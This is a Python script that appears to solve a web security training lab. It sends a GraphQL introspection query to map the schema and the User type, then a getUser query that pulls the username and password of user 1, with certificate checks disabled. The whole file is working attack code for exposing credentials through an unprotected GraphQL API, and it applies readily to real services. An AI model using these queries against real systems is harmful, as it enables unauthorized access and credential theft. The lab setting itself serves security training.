import json
import http.client
import pprint
import ssl

LAB_ID = "???"


def POST_graphql_v1(
        fields
) -> http.client.HTTPResponse:
    method, path = 'POST', '/graphql/v1'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/post?postId=1',
        'content-type': 'application/json',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'te': 'trailers',
    }
    body = json.dumps(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())

    connection.request(method, path, body, headers)
    return connection.getresponse()


recon_fields = {
    "query": f"""
            
                query getUser($id: Int!) {{
                    getUser(id: $id) {{
                        username
                        password
                    }}
                }}
        """,
    "variables": {
        "id": 1,
    },
}

query_fields = {
    "query": f"""
            
                query IntrospectionQuery {{
                    __schema {{
                        queryType {{
                            name
                        }}
                        mutationType {{
                            name
                        }}
                        types {{
                            name
                        }}
                    }}
                    __type(name: "User") {{
                        name
                        fields {{
                            name
                            type {{
                                name
                                kind
                            }}
                        }}
                    }}
                }}
        """,
}

print(pprint.pprint(json.loads(POST_graphql_v1(recon_fields).read())))
print(pprint.pprint(json.loads(POST_graphql_v1(query_fields).read())))
